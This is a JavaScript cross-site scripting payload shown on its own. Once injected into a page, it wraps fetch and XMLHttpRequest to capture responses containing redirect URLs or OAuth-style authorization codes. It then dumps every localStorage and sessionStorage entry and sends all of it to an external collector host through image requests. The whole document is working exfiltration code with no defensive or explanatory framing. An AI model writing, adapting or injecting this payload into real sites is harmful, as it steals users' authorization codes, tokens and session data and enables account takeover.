(() => {
  const COLLECT = 'https://4w1dmi8iw7j444xbtn41coosojuai06p.oastify.com/collect';
  function exfil(name, data){
    try{
      // short payload via Image GET (safe for fragments)
      new Image().src = COLLECT + '?k=' + encodeURIComponent(name) + '&v=' + encodeURIComponent(data).slice(0,2000);
    }catch(e){}
  }

  // Hook fetch
  const _fetch = window.fetch;
  window.fetch = function(input, init){
    return _fetch.apply(this, arguments).then(async res => {
      try{
        // clone so we don't break the app
        const r = res.clone();
        const ct = r.headers.get('content-type') || '';
        if(ct.includes('application/json') || ct.includes('text/')){
          const txt = await r.text().catch(()=>'');
          if(txt && (txt.includes('redirectUrl') || txt.match(/code=\d{6,}/))){
            exfil('fetch_resp', txt);
          }
        }
      }catch(e){}
      return res;
    });
  };

  // Hook XHR
  (function(open, send) {
    XMLHttpRequest.prototype.open = function(method, url){
      this._hooked_url = url;
      return open.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body){
      this.addEventListener('load', function(){
        try{
          const ct = this.getResponseHeader && this.getResponseHeader('content-type') || '';
          if(ct && (ct.includes('application/json') || ct.includes('text/'))){
            if(this.responseText && (this.responseText.includes('redirectUrl') || this.responseText.match(/code=\d{6,}/))){
              exfil('xhr_resp', this.responseText);
            }
          }
        }catch(e){}
      });
      return send.apply(this, arguments);
    };
  })(XMLHttpRequest.prototype.open, XMLHttpRequest.prototype.send);

  // Also dump local/session storage (useful)
  try {
    Object.keys(localStorage || {}).forEach(k => exfil('ls_'+k, localStorage.getItem(k)));
    Object.keys(sessionStorage || {}).forEach(k => exfil('ss_'+k, sessionStorage.getItem(k)));
  } catch (e){}

  exfil('xss_hook', 'installed');
})();
